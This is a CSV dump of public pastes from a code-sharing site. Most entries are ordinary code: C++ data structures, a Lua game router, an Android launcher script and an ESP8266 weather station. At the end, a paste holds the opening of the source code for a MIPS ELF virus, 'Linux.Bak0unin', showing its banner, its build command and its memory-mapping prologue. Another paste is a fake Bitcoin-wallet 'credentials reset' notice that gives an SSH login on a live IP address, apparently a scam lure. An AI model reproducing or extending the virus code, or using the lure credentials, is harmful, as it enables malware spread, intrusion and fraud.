id,title,username,language,date,content
hpJZad51,login,rnsribeiro,JSON,Friday 16th of June 2023 06:56:32 AM CDT,"{
	""Status"":""OK""
}"
vgQrLqE7,Untitled,35657,C++,Friday 16th of June 2023 06:39:47 AM CDT,"#include <iostream>

using namespace std;




template <typename T>
class Stack {
public:
    void Push(const T& element) {
        elements_[size] = element;;
        size++;
    }
    void Pop() {
        size--;;
    }
    const T& Top() const {
        return elements_[size - 1];
    }
    T& Top() {
        return elements_[size - 1];
    }

    int Size() const {
        return size;
    }
    bool Empty() const {
        return size == 0;;
    }

private:
    T elements_[100];
    int size = 0;
};

int main() {
    Stack<int> stack;
    for (uint32_t i = 0; i < 10; ++i) {
        stack.Push(i);
        cout << stack.Top() << endl;
    }
    cout << endl;

    while (!stack.Empty()) {
        cout << stack.Top() << endl;
        stack.Pop();
    }
    cout << endl;
}"
iU4yHyKq,Network Router,openblocki,Lua,Friday 16th of June 2023 06:36:41 AM CDT,"-- Author : Mystical_MechGod aka. openblocki aka. Luc

local server_connection = peripheral.wrap(""back"")
local monitor = peripheral.wrap(""top"")

local y = 1


monitor.write(os.getComputerID)
rednet.open(""front"")

while true do

    local senderId, message, protocol = os.pullEvent(""rednet_message"")

    if message == ""Password"" then
        y= y + 1
        monitor.setCursorPos(1,y)
        monitor.write(senderId)
        server_connection.transmit(1,1,senderId)
        
    end
end"
6s0b9eiH,Untitled,35657,C++,Friday 16th of June 2023 06:36:25 AM CDT,"#include <iostream>

using namespace std;

template <typename T>
class ForwardList {
public:

    ForwardList() : size(0), head(nullptr) {}

    ForwardList(const ForwardList& other) : size(other.size), head(nullptr) {
        if (other.head != nullptr) {
            head = new Node{ other.head->value, nullptr };
            Node* temp = head;
            Node* other_temp = other.head;
            while (other_temp->next != nullptr) {
                other_temp = other_temp->next;
                temp->next = new Node{ other_temp->value, nullptr };
                temp = temp->next;
            }
        }
    }

    /*ForwardList(ForwardList& other) :size(0), head(nullptr) {
        while (size != other.size) {
            Node* temp = other.head;
            for (int i = 0; i != other.size - size - 1; i++) {
                temp = temp->next;
            }
            Push_front(temp->value);
        }
    };*/

    ForwardList(ForwardList&& other) : size(other.size), head(other.head) {
        other.size = 0;
        other.head = nullptr;
    }

    ForwardList& operator=(const ForwardList& other) {
        if (this != &other) {
            Clear();
            if (other.head != nullptr) {
                head = new Node{ other.head->value, nullptr };
                Node* temp = head;
                Node* other_temp = other.head;
                while (other_temp->next != nullptr) {
                    other_temp = other_temp->next;
                    temp->next = new Node{ other_temp->value, nullptr };
                    temp = temp->next;
                }
            }
            size = other.size;
        }
        return *this;
    }

    

    ForwardList& operator=(ForwardList&& other) {
        if (this != &other) {
            Clear();
            size = other.size;
            head = other.head;
            other.size = 0;
            other.head = nullptr;
        }
        return *this;
    }

    void Push_front(const T& value) {
        head = new Node{ value, head };
        size++;
    }

    void Pop_front() {
        if (size > 0) {
            Node* temp = head;
            head = head->next;
            delete temp;
            size--;
        }
    }

    void Print() {
        Node* temp = head;
        while (temp != nullptr) {
            cout << temp->value << "" "";
            temp = temp->next;
        }
        cout << endl;
    }

    int Size() const {
        return size;
    }

    T Front() const {
        if (head != nullptr) {
            return head->value;
        }
    }

    void Clear() {
        while (head != nullptr) {
            Pop_front();
        }
    }

    void Insert(const int index, const int& value) {
        if (index == 0) {
            Push_front(value);
            return;
        }
        if (index > 0 && index < size) {
            Node* temp = head;
            for (int i = 0; i < index - 1; i++) {
                temp = temp->next;
            }
            temp->next = new Node{ value, temp->next };
            size++;
        }
    }

    void Erase(const int index) {
        if (index == 0) {
            Pop_front();
            return;
        }
        if (index > 0 && index < size) {
            Node* temp = head;
            for (int i = 0; i < index - 1; i++) {
                temp = temp->next;
            }
            Node* buf = temp->next->next;
            delete temp->next;
            temp->next = buf;
            size--;
        }
    }

    ~ForwardList() {
        Clear();
    }

private:
    struct Node { //односвязный список состоит из узлов
        T value; // узел хранит информативную часть
        Node* next; // и указатель на следующий узел в списке
    };
    int size = 0;
    Node* head = nullptr;
};

        // реализовать функцию Clear (очистка списка), конструктор по умолчанию, деструктор

int main() {
    ForwardList<int> list1;

    for (int i = 0; i < 10; i++) {
        list1.Push_front(i + 1);
        list1.Print();
    }

    cout << list1.Size() << endl;

    for (int i = 0; i < 3; i++) {
        list1.Pop_front();
        list1.Print();
    }

    list1.Insert(2, 12);

    list1.Print();


    list1.Erase(3);

    list1.Print();

    cout << list1.Size() << endl;

    cout << list1.Front() << endl;

    ForwardList<int> list2;
    
    list2 = move(list1);

    cout << ""list2:"" << endl;

    list2.Print();

    cout << ""list1:"" << endl;

    list1.Print();
}"
eScAPN9Q,Hide all apps in App Draw Lawnchair Android,metalx1000,Bash,Friday 16th of June 2023 06:34:52 AM CDT,"#Hide apps from lawnchair app drawer
#Root Needed
#run the following commands and put the out in
#""/data/data/ch.deletescape.lawnchair.plah/shared_prefs/ch.deletescape.lawnchair.plah/shared_prefs/ch.deletescape.lawnchair.plah_preferences.xml""

echo '<set name=""hidden-app-set"">'
db=""/data/data/ch.deletescape.lawnchair.plah/databases/app_icons.db""
echo ""select componentName from icons;""|sqlite3 ""$db""|while read app;
do
	echo ""<string>$app#0</string>""
done
echo ""</set>""
"
xmxwAcu6,Mini Weather Station,mayerm001,C++,Friday 16th of June 2023 06:32:11 AM CDT,"/*
Mini Local Weather Station
Copyright (c) Mayer Mihály 2023
*/
#include ""SSD1306Wire.h""
#include <ESP8266WiFiMulti.h> 
#include <ESP8266HTTPClient.h>
#include <WiFiClientSecureBearSSL.h>
#include <ArduinoJson.h>
#include ""weather.h"" // weather_sunny, weather_rain, weather_cloud

SSD1306Wire display(0x3c, SCL, SDA); 

const char* googleHost = ""https://www.googleapis.com/geolocation/v1/geolocate"";
const char* GOOGLE_APIKEY = ""key=<Google API key>"";
const char* weatherPage = ""http://api.openweathermap.org/data/2.5/weather?lat=%f&lon=%f&units=metric&APPID=<OpenWeatherMap API ID>"";

double latitude    = 0.0;
double longitude   = 0.0;
char buffer[8];
char sbuffer[256];
char* wbuffer;
String line = """";
String weatherMain = """";
double temperature = 0.0;
double humidity = 0.0;

ESP8266WiFiMulti wifiMulti;
IPAddress ip(192, 168, 0, 99);
IPAddress gateway(192, 168, 0, 1);
IPAddress subnet(255, 255, 255, 0);
IPAddress dns(8, 8, 8, 8);
char WiFiPassword[] = ""<password>"";
char router_ssid_1[] = ""<router1>"";
char router_ssid_2[] = ""<router2>"";
char router_ssid_3[] = ""<router3>"";

unsigned long previousMillis = 0UL;
unsigned long interval = 60000UL;

bool connectToWifi()
{ 
  wifiMulti.addAP(router_ssid_1, WiFiPassword);
  wifiMulti.addAP(router_ssid_2, WiFiPassword);
  wifiMulti.addAP(router_ssid_3, WiFiPassword);
  
  int count = 0;  
  while (wifiMulti.run() != WL_CONNECTED && count++ < 20) {} 
  if (wifiMulti.run() == WL_CONNECTED) {
    WiFi.config(ip, gateway, subnet, dns);
    Serial.println(""Connect to "" + WiFi.SSID()); 
    return true;
  } else {
    Serial.println(""Unable to connect Wifi.""); 
    return false;  
  }
}

void getWeather(String wBuffer)
{
  if (wifiMulti.run() == WL_CONNECTED) {
      DynamicJsonDocument document(1024); 
      WiFiClient client;
      HTTPClient http;
      http.begin(client, wBuffer);
      http.addHeader(""Content-Type"", ""application/x-www-form-urlencoded"");                                    
      int httpResponseCode = http.GET();
      Serial.println(httpResponseCode);
      if (httpResponseCode > 0) {
        if (httpResponseCode == HTTP_CODE_OK || httpResponseCode == HTTP_CODE_MOVED_PERMANENTLY) {
            String response = http.getString();
            Serial.println(response);
            deserializeJson(document, response);
            JsonObject object = document.as<JsonObject>();
            weatherMain = object[""weather""][0][""main""].as<String>();
            temperature = object[""main""][""temp""].as<float>();
            humidity = object[""main""][""humidity""].as<float>();
        }
      }
      http.end();
      client.flush(); 
  }
}

void getLocation()
{
    if (wifiMulti.run() == WL_CONNECTED) {
        DynamicJsonDocument document(1024); 
        HTTPClient http;
        std::unique_ptr<BearSSL::WiFiClientSecure>client(new BearSSL::WiFiClientSecure);
        client->setInsecure();
        http.begin(*client, googleHost);
        http.addHeader(""Content-Type"", ""application/x-www-form-urlencoded"");
        http.addHeader(""Content-Length"", String(sizeof(GOOGLE_APIKEY)));
        http.setTimeout(10000);                      
        int httpResponseCode = http.POST(GOOGLE_APIKEY);
        Serial.println(httpResponseCode);
        if (httpResponseCode > 0) {
          if (httpResponseCode == HTTP_CODE_OK || httpResponseCode == HTTP_CODE_MOVED_PERMANENTLY) {
              String response = http.getString();
              Serial.println(response);
              deserializeJson(document, response);
              JsonObject object = document.as<JsonObject>();
              latitude = object[""location""][""lat""].as<float>();
              longitude = object[""location""][""lng""].as<float>();
              Serial.println(String(latitude) + "","" + String(longitude));
          }
        }
        http.end();
    }
}

void getWeather_and_display()
{
      sprintf(sbuffer,weatherPage,latitude,longitude);
      getWeather(sbuffer);
      sprintf(sbuffer,""%.1f °C"",temperature);
      display.drawString(70, 8, String(sbuffer)); 
      sprintf(sbuffer,""%.1f %%"",humidity);
      display.drawString(70, 40, String(sbuffer));
      weatherMain.toLowerCase();
      if (weatherMain.indexOf(""rain"") >= 0) { 
        display.drawXbm(0, 0, 60, 60, weather_rain);
      } else if (weatherMain.indexOf(""clouds"") >= 0) {
        display.drawXbm(0, 0, 60, 60, weather_cloud);
      } else {
        display.drawXbm(0, 0, 60, 60, weather_sunny);
      }
      display.display(); 
}

void setup() {
  Serial.begin(9600);

  connectToWifi();
  display.init();
  display.clear();
  display.setFont(ArialMT_Plain_16);
  display.setTextAlignment(TEXT_ALIGN_LEFT);
  display.drawVerticalLine(63,0,63);

  getLocation();
  getWeather_and_display();
  previousMillis = millis();
}

void loop() {
  if (wifiMulti.run() != WL_CONNECTED) connectToWifi();
  unsigned long currentMillis = millis();
  if(currentMillis - previousMillis > interval)
  {
      getWeather_and_display();
      previousMillis = currentMillis;
  }
}
"
YTaWxT4A,ascii.txt,FlyFar,GetText,Friday 16th of June 2023 06:30:31 AM CDT," ___   _  _    __    __  _   ___        ___   _  _    ___  _  __ 
| _,\ | || |  /__\  |  \| | | __|  __  | __| | || |  / _/ | |/ / 
| v_/ | >< | | \/ | | | ' | | _|  |__| | _|  | \/ | | \__ |   <  
|_|   |_||_|  \__/  |_|\__| |___|      |_|    \__/   \__/ |_|\_\ 
                    ----------------------------
                    Written In : GO 1.16.2
                    
                    Written By : Scare_Sec_Hackers"
RTGW4XPx,go.mod,FlyFar,Go,Friday 16th of June 2023 06:29:45 AM CDT,"module main

go 1.16

require github.com/fatih/color v1.12.0 // indirect"
9d0TPDSj,BTC Wallet Credentials have been reset,abbredescr_91,GetText,Friday 16th of June 2023 06:29:14 AM CDT,"Dear User
We have received a request to reset the login information for your Bitcoin wallet. If you did not make this request, please disregard this message.
Your new login credentials will be 
ikonopisqw:Ta8yQQ on 45.9.148.244(SSH)
Regards"
sGZpgYw7,Untitled,wclovers,PHP,Friday 16th of June 2023 06:24:38 AM CDT,"add_filter('wcfmmp_free_shipping_threshold_consider_tax','__return_false');"
McmyWFau,Spartan Splash Font,tommyosheawebdesign,CSS,Friday 16th of June 2023 06:22:25 AM CDT,"    font-family: Spartan;
    font-size: 18px;
    line-height: 34px;
    font-weight: 500;"
zXp5Gpuq,Linux.Bak0unin - A MIPS-32 ELF non-resident virus with false disassembly - Source Code,FlyFar,ASM (NASM),Friday 16th of June 2023 06:16:56 AM CDT,"##############################################################
##  A MIPS-32 ELF non-resident virus with false disassembly ##
##  Made with love by S01den (@s01den)                      ##
##  From the tmp.0ut crew !                                 ##
##  01/2021                                                 ##
##############################################################

# .____    .__       ________  ________         _____  ._____________  _________   __________         __                .__
# |    |   |__| ____ \_____  \ \_____  \       /     \ |   \______   \/   _____/   \______   \_____  |  | ____ __  ____ |__| ____
# |    |   |  |/    \  _(__  <  /  ____/      /  \ /  \|   ||     ___/\_____  \     |    |  _/\__  \ |  |/ /  |  \/    \|  |/    \
# |    |___|  |   |  \/       \/       \     /    Y    \   ||    |    /        \    |    |   \ / __ \|    <|  |  /   |  \  |   |  \
# |_______ \__|___|  /______  /\_______ \ /\ \____|__  /___||____|   /_______  / /\ |______  /(____  /__|_ \____/|___|  /__|___|  /
#         \/       \/       \/         \/ \/         \/                      \/  \/        \/      \/     \/          \/        \/


# build command: mips-as Linux.Bak0unine.asm -o bak.o ; mips-ld bak.o -o bak


# ---------------------------- CUT-HERE ----------------------------

.text
  .global _start

_start:
# - start of the prolog - #

# first of all, we have to mmap an executable area in memory where we can copy the aligned code
  sw	$zero,20($sp)
  li	$v0,0
  sw	$v0,16($sp)

  li $a0, 0
  li $a1, 0x6a8
  li $a2, 7    # PROT_READ|PROT_WRITE|PROT_EXEC
